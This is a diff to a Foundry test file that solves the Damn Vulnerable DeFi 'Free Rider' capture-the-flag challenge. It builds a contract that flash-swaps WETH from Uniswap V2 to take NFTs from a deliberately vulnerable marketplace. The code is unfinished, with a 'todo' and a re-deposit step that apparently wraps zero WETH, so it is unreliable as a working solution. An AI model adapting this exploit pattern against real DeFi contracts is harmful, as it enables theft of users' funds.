@@ -66,12 +66,12 @@ contract FreeRiderChallenge is Test {
 
         token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
         uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
-            address(token), // token to be traded against WETH
-            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
-            0, // amountTokenMin
-            0, // amountETHMin
-            deployer, // to
-            block.timestamp * 2 // deadline
+                                                                             address(token), // token to be traded against WETH
+                                                                             UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
+                                                                             0, // amountTokenMin
+                                                                             0, // amountETHMin
+                                                                             deployer, // to
+                                                                             block.timestamp * 2 // deadline
         );
 
         // Get a reference to the created Uniswap pair
@@ -125,17 +125,18 @@ contract FreeRiderChallenge is Test {
      */
     function test_freeRider() public checkSolvedByPlayer {
         Rescuer rescuer = new Rescuer(
-            token,
-            uniswapV2Factory,
-            uniswapV2Router,
-            uniswapPair,
-            marketplace,
-            nft,
-            recoveryManager,
-            player
+                                      token,
+                                      uniswapV2Factory,
+                                      uniswapV2Router,
+                                      uniswapPair,
+                                      marketplace,
+                                      nft,
+                                      recoveryManager,
+                                      player,
+                                      weth
         );
 
-        vm.deal(address(rescuer), 15.1 ether); // todo how to get the initial ether?
+        payable(address(rescuer)).transfer(PLAYER_INITIAL_ETH_BALANCE);
         rescuer.rescue();
     }
 
@@ -169,11 +170,12 @@ contract Rescuer is Test{
     FreeRiderNFTMarketplace marketplace;
     DamnValuableNFT nft;
     FreeRiderRecoveryManager recoveryManager;
+    WETH weth;
     address player = msg.sender;
 
     constructor(DamnValuableToken _token, IUniswapV2Factory _uniswapV2Factory, IUniswapV2Router02 _uniswapV2Router,
                 IUniswapV2Pair _uniswapPair, FreeRiderNFTMarketplace _marketplace, DamnValuableNFT _nft,
-                FreeRiderRecoveryManager _recoveryManager, address _player) {
+                FreeRiderRecoveryManager _recoveryManager, address _player, WETH _weth) {
         token = _token;
         uniswapV2Factory = _uniswapV2Factory;
         uniswapV2Router = _uniswapV2Router;
@@ -182,9 +184,15 @@ contract Rescuer is Test{
         nft = _nft;
         recoveryManager = _recoveryManager;
         player = _player;
+        weth = _weth;
     }
 
     function rescue() external {
+        // Flashloan some WETH from the Uniswap pair
+        uniswapPair.swap(15 ether, 0, address(this), new bytes(0));
+    }
+
+    function rescueNFTs() private {
         uint256[] memory tokenIds = new uint256[](6);
         for (uint256 i = 0; i < 6; i++) {
             tokenIds[i] = i;
@@ -194,9 +202,33 @@ contract Rescuer is Test{
             nft.safeTransferFrom(address(this), address(recoveryManager), i);
         }
 
-        nft.safeTransferFrom(address(this), address(recoveryManager), 5, abi.encode(player));
+        nft.safeTransferFrom(address(this), address(recoveryManager), 5, abi.encode(address(this)));
     }
 
+    // Uniswap V2 callback
+    function uniswapV2Call(
+                           address sender,
+                           uint wethAmount,
+                           uint amount1,
+                           bytes calldata _data
+    ) external {
+        uint256 wethBalance = weth.balanceOf(address(this));
+        require(wethBalance >= 15 ether, "Not enough WETH");
+        require(wethAmount == 15 ether, "Incorrect WETH amount");
+        require(amount1 == 0, "Unexpected amount1");
+        uint fee = (wethAmount * 5) / 997 + 1; // 0.3% fee
+
+        weth.withdraw(wethBalance);
+
+        rescueNFTs();
+
+        // todo
+        weth.deposit{value: weth.balanceOf(address(this))}();
+
+        weth.transfer(address(uniswapPair), wethAmount + fee);
+    }
+
+    // NFT callback
     function onERC721Received(address, address, uint256 tokenId, bytes memory _data)
         external
         returns (bytes4) {
